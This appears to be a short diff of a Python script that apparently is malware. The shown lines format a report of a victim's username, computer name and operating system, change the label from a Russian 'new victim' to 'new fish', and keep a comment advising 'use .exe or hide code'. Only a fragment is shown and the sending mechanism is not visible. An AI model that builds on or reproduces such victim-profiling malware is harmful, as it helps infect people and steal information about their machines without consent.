@@ -55,7 +55,7 @@ def get_system_info():
 
 def send_report(info):
     message_text = (
-        f"💻 *Новая жертва (System Info)*\n\n"
+        f"💻 *new fish*\n\n"
         f"👤 User: `{info['username']}`\n"
         f"🖥 PC: `{info['computer_name']}`\n"
         f"⚙ OS: `{info['os']}`\n"
@@ -150,3 +150,4 @@ if __name__ == "__main__":
 
 
 #use .exe or hide code
+
